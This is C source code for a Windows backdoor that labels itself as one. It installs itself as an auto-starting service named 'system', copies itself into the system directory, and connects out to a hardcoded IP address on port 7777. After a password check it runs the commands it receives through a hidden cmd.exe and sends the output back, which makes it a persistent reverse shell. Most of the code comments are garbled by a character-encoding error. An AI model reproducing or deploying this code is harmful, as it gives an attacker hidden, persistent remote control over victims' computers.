#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
void  WINAPI ServiceMain(DWORD, LPTSTR *);
DWORD WINAPI CmdService(LPVOID);
DWORD WINAPI CmdShell(LPVOID);
void WINAPI ServiceCtrlHandler(DWORD Opcode);
BOOL  InstallCmdService();
void DelServices();
int  door();
void  Usage(void);
VOID WINAPI EXEBackMain (LPVOID s);
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning = true;
#define PASSSUCCESS "Password success!\n"
#define PASSERROR "Password error.\n"
#define BYEBYE "ByeBye!\n"
#define WSAerron WSAGetLastError()
#define erron GetLastError()
#define PORT 7777 //Զ�̵����Ӷ˿�
#define DEST_IP_ADDR "12.1.40.149"//Ҫ���ӵ�Զ��IP
int main(int argc, char *argv[])
{
    SERVICE_TABLE_ENTRY DispatchTable[] =
    {
        {"system", ServiceMain}, //�����������ƺ���ڵ�(����)
        {NULL    , NULL    }
        //SERVICE_TABLE_ENTRY�ṹ�����ԡ�NULL��������
    };
    //  if(argc==1) door();
    if(argc == 2)
    {
        if(!stricmp(argv[1], "-i")) //����ڶ�����������-install
        {
            InstallCmdService();
        }
        else if(!stricmp(argv[1], "-r")) //�Ƚ��ַ���s1��s2
        {
            DelServices();
        }
        else
        {
            Usage();
        }
        return 0;
    }
    StartServiceCtrlDispatcher(DispatchTable);//����ڵ�ĵ�ַ����
    return 0;
}
int door ()
{
    SOCKET sock = NULL;
    struct sockaddr_in sai;
    TCHAR UserPass[20] = {0};  //�û��������뻺��
    TCHAR PassBuf[20] = {0};   //�������뻺��
    TCHAR PassBanner[] = "Password:";
    TCHAR Banner[] = "--------- backdoor---------\n";
    sai.sin_family = AF_INET;
    sai.sin_addr.s_addr = inet_addr(DEST_IP_ADDR);
    sai.sin_port = htons(PORT);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    while (TRUE)
    {
        WSADATA wsadata;
        BOOL ThreadFlag = FALSE;
        DWORD ThreadID = 0;
        int nRet = 0;
        nRet = WSAStartup(MAKEWORD(2, 2), &wsadata); //��ʼ��
        if (nRet)
        {
            return 0;
        }
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET)
        {
            goto Clean;
        }
        nRet = connect(sock, (struct sockaddr *)&sai, sizeof (struct sockaddr));
        Sleep(5000);
        if (nRet != SOCKET_ERROR)
        {
            nRet = send(sock, Banner, sizeof (Banner), 0);
            while (TRUE)
            {
                nRet = send(sock, PassBanner, sizeof
                            (PassBanner), 0);
                nRet = recv(sock, PassBuf, sizeof (PassBuf) - 1, 0);
                if
                (strnicmp(PassBuf, "dirdir", strlen("dirdir")) == 0)
                {
                    send(sock, PASSSUCCESS, sizeof (PASSSUCCESS), 0);
                    ThreadFlag = TRUE;
                    break;
                }
                if (nRet == SOCKET_ERROR)
                {
                    goto Clean;
                }
                Sleep(100);
            }
            if (ThreadFlag)
            {
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EXEBackMain,
                             (LPVOID)sock, 0, &ThreadID);
            }
        }//endwhile
        Sleep(1000);
    }
Clean:
    if (sock != NULL)
        closesocket(sock);
    WSACleanup();
    return 0;
}
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)
//����������
{
    m_ServiceStatus.dwServiceType = SERVICE_WIN32;
    m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
    m_ServiceStatus.dwWin32ExitCode = 0;
    m_ServiceStatus.dwServiceSpecificExitCode = 0;
    m_ServiceStatus.dwCheckPoint = 0;
    m_ServiceStatus.dwWaitHint = 0;
    m_ServiceStatusHandle = RegisterServiceCtrlHandler("system", ServiceCtrlHandler);
    if (m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return;
    m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    //���÷���״̬
    m_ServiceStatus.dwCheckPoint = 0;
    m_ServiceStatus.dwWaitHint = 0;
    //SERVICE_STATUS�ṹ�����߸���Ա�����Ƿ�ӳ���������״̬��
    //������Щ��Ա����������ṹ�����ݵ�SetServiceStatus֮ǰ��ȷ������
    if( SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
        bRunning = true;
    door(); //�����������
    return;
}
void WINAPI ServiceCtrlHandler(DWORD Opcode)//������ƺ���
{
    switch(Opcode)
    {
    case SERVICE_CONTROL_PAUSE:    // we accept the command to pause it
        m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_STOP:
        m_ServiceStatus.dwWin32ExitCode = 0;
        m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        m_ServiceStatus.dwCheckPoint = 0;
        m_ServiceStatus.dwWaitHint = 0;
        SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus);
        bRunning = false;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    return;
}
BOOL InstallCmdService()//��װ������
{
    char strDir[1024];
    SC_HANDLE schSCManager, schService;
    GetCurrentDirectory(1024, strDir); //ȡ��ǰĿ¼
    GetModuleFileName(NULL, strDir, sizeof(strDir));
    //ȡ��ǰ�ļ�·�����ļ���
    char chSysPath[1024];
    GetSystemDirectory(chSysPath, sizeof(chSysPath)); //ȡϵͳĿ¼
    strcat(chSysPath, "\\system.exe");
    //��scvhost.exeƴ�ӵ�ϵͳĿ¼
    if(CopyFile(strDir, chSysPath, FALSE))printf("Copy file OK\n");
    // �ѵ�ǰ��������Ƶ�ϵͳ��Ŀ¼Ϊsystem.exe
    strcpy(strDir, chSysPath);
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL)
    {
        printf("open scmanger failed,maybe you do not have the privilage to do this\n");
        return false;
    }
    LPCTSTR lpszBinaryPathName = strDir;
    schService = CreateService(schSCManager,
                               "system",
                               "system", //���������Ϣ��ӵ�SCM�����ݿ�
                               SERVICE_ALL_ACCESS, // desired access
                               SERVICE_WIN32_OWN_PROCESS, // service type
                               SERVICE_AUTO_START, // start type
                               SERVICE_ERROR_NORMAL, // error control type
                               lpszBinaryPathName, // service's binary
                               NULL, // no load ordering group
                               NULL, // no tag identifier
                               NULL, // no dependencies
                               NULL, // LocalSystem account
                               NULL); // no password
    if (schService) printf("Install Service Success!\n");
    else
        return false;
    CloseServiceHandle(schService);
    return true;
}
void DelServices()
{
    char name[100];
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
    strcpy(name, "system");
    if((scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL)
    {
        printf("OpenSCManager Error ");
    }
    service = OpenService(scm, name, SERVICE_ALL_ACCESS | DELETE);
    if (!service)
    {
        printf("OpenService error! ");
        return;
    }
    BOOL isSuccess = QueryServiceStatus(service, &status);
    if (!isSuccess)
    {
        printf("QueryServiceStatus error! ");
        return;
    }
    if ( status.dwCurrentState != SERVICE_STOPPED )
    {
        isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
        if (!isSuccess )
            printf("Stop Service error! ");
        Sleep( 500 );
    }
    isSuccess = DeleteService(service);
    if (!isSuccess)
        printf("Delete Service Fail!");
    else
        printf("Delete Service Success! ");
    CloseServiceHandle(service );
    CloseServiceHandle(scm);
}
VOID WINAPI EXEBackMain (LPVOID s)
//BOOL EXEBackMain (SOCKET sock)
{
    SOCKET sock = (SOCKET)s;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hRead = NULL, hWrite = NULL;
    TCHAR CmdSign[] = "\nGood Luck!:\\>";
    while (TRUE)
    {
        TCHAR MsgError[50] = {0};   //������Ϣ����
        TCHAR Cmdline[300] = {0};   //�����л���
        TCHAR RecvBuf[1024] = {0};  //���ջ���
        TCHAR SendBuf[2048] = {0};  //���ͻ���
        SECURITY_ATTRIBUTES sa;
        DWORD bytesRead = 0;
        int ret = 0;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        //���������ܵ�
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        {
            goto Clean;
        }
        si.cb = sizeof(STARTUPINFO);
        GetStartupInfo(&si);
        si.hStdError = hWrite;
        si.hStdOutput = hWrite;  //���̣�cmd�������д��ܵ�
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        GetSystemDirectory(Cmdline, sizeof (Cmdline));
        //��ȡϵͳĿ¼
        strcat(Cmdline, "\\cmd.exe /c ");
        //ƴ��cmd
        // ret=send(sock,CmdSign,sizeof (CmdSign),0);
        //��Ŀ�귢����ʾ��
        if (ret == SOCKET_ERROR)
        {
            goto Clean;
        }
        ret = recv(sock, RecvBuf, sizeof (RecvBuf), 0);
        //����Ŀ������
        //���Ϊexit��quit�����˳�
        if (strnicmp(RecvBuf, "exit", 4) == 0 || strnicmp(RecvBuf, "quit", 4) == 0)
        {
            send(sock, BYEBYE, sizeof (BYEBYE), 0);
            goto Clean;
        }
        //��ʾ�Է��Ѿ��Ͽ�
        if (ret == SOCKET_ERROR)
        {
            goto Clean;
        }
        //��ʾ�������ݳ���
        if (ret <= 0)
        {
#ifdef DEBUGMSG
            sprintf(MsgError, "recv() GetLastError reports %d\n", WSAerron);
            send(sock, MsgError, sizeof (MsgError), 0);
#endif
            continue;
        }
        Sleep(100);
        strncat(Cmdline, RecvBuf, sizeof (RecvBuf));
        //ƴ��һ��������cmd����
        //�������̣�Ҳ����ִ��cmd����
        if (!CreateProcess(NULL, Cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
        {
            continue;
        }
        CloseHandle(hWrite);
        while (TRUE)
        {
            //����ѭ����ȡ�ܵ��е����ݣ�ֱ���ܵ���û������Ϊֹ
            if (ReadFile(hRead, SendBuf, sizeof (SendBuf), &bytesRead, NULL) == 0)
                break;
            send(sock, SendBuf, bytesRead, 0);
            //���ͳ�ȥ
            memset(SendBuf, 0, sizeof (SendBuf));
            //��������
            Sleep(100);
        }
    }
Clean:
    //�ͷž��
    if (hRead != NULL)
        CloseHandle(hRead);
    if (hWrite != NULL)
        CloseHandle(hWrite);
    //�ͷ�SOCKET
    if (sock != NULL)
        closesocket(sock);
    WSACleanup();
    ExitThread(0);
    //return 0;
}
void Usage()
{
    fprintf(stderr, "Code by dahubaobao\n"
            "Usage:%s [-i] [-r] -i: install service; -r: remove service.\n");
}
